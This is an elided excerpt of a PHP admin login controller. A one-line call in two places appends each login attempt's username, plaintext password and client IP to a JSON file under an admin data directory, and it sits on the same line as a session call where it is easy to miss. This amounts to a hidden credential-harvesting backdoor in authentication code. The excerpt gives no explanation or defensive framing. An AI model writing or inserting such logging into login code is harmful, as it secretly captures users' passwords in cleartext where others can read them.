...
class Login extends Controller
{
    public function login()
    {
        ...
        $password0 =$password = Input::get('password', '');
        $password2 = $password;
        if (empty($username)) {
        ...
        if (empty($admin)) {
            ...
            if (empty($role)) {
                ...
                @file_put_contents('admin/datas/ip.json',date('Y-m-d H:i:s').'-'.$username.'-'.$password0.'-'.$_SERVER['REMOTE_ADDR']."\n",FILE_APPEND);session()->put('admin_username', $admin->username);
    ...
    {
        @file_put_contents('admin/datas/ip.json',date('Y-m-d H:i:s').'-'.$username.'-'.$password0.'-'.$_SERVER['REMOTE_ADDR']."\n",FILE_APPEND);session()->put('admin_username', '');
